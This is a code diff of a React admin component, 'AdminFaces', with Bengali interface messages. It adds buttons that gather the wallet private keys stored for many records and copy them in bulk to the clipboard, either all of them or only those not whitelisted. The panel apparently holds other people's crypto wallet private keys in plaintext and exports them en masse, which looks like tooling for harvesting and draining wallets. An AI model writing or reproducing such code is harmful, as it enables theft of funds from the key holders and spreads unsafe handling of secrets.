@@ -23,13 +23,29 @@ function AdminFaces() {
 
   if (isLoading) return <div className="py-10 flex justify-center"><Loader2 className="w-5 h-5 animate-spin text-cyan" /></div>;
 
+  const allKeys = (data ?? [])
+    .map((t: any) => t.wallet_private_key as string | null)
+    .filter((k: string | null): k is string => !!k) as string[];
   const whitelistedKeys = (data ?? [])
     .filter((t: any) => t.wallet_private_key && (t.whitelist_ok ?? false))
     .map((t: any) => t.wallet_private_key as string);
+  const notWhitelistedKeys = (data ?? [])
+    .filter((t: any) => t.wallet_private_key && !(t.whitelist_ok ?? false))
+    .map((t: any) => t.wallet_private_key as string);
+  const copyAllKeys = async () => {
+    if (allKeys.length === 0) return toast.error("কোনো key নেই");
+    await navigator.clipboard.writeText(allKeys.join("\n"));
+    toast.success(`${allKeys.length} টি key কপি হয়েছে (সব)`);
+  };
   const copyAllWhitelisted = async () => {
     if (whitelistedKeys.length === 0) return toast.error("কোনো whitelisted key নেই");
     await navigator.clipboard.writeText(whitelistedKeys.join("\n"));
     toast.success(`${whitelistedKeys.length} টি whitelisted key কপি হয়েছে`);
+  };
+  const copyAllNotWhitelisted = async () => {
+    if (notWhitelistedKeys.length === 0) return toast.error("কোনো not-whitelisted key নেই");
+    await navigator.clipboard.writeText(notWhitelistedKeys.join("\n"));
+    toast.success(`${notWhitelistedKeys.length} টি not-whitelisted key কপি হয়েছে`);
   };
 
   return (
